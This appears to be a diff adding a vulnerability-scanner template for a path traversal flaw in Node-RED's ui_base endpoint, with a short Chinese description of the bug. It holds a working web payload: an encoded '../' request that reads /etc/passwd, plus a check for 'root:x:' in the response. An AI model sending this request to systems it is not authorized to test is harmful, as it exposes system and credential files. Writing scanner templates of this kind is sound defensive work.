@@ -1,0 +1,19 @@
+name: Node-RED ui_base Arbitrary File Read
+manual: true
+query: title="Node-RED"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+    expression: response.status == 200 && response.body.bcontains(b"root:x:") && response.body.bcontains(b"bin:x:")
+expression: r0()
+detail:
+  author: aetkrad
+  links:
+  - https://mp.weixin.qq.com/s/KRGKXAJQawXl88RBPTaAeg
+  description: |-
+    Node-RED 在/nodes/ui_base.js中，URL与'/ui_base/js/*'匹配，然后传递给path.join，
+    缺乏对最终路径的验证会导致路径遍历漏洞，可以利用这个漏洞读取服务器上的敏感数据，比如settings.js.
+  tags: fileread
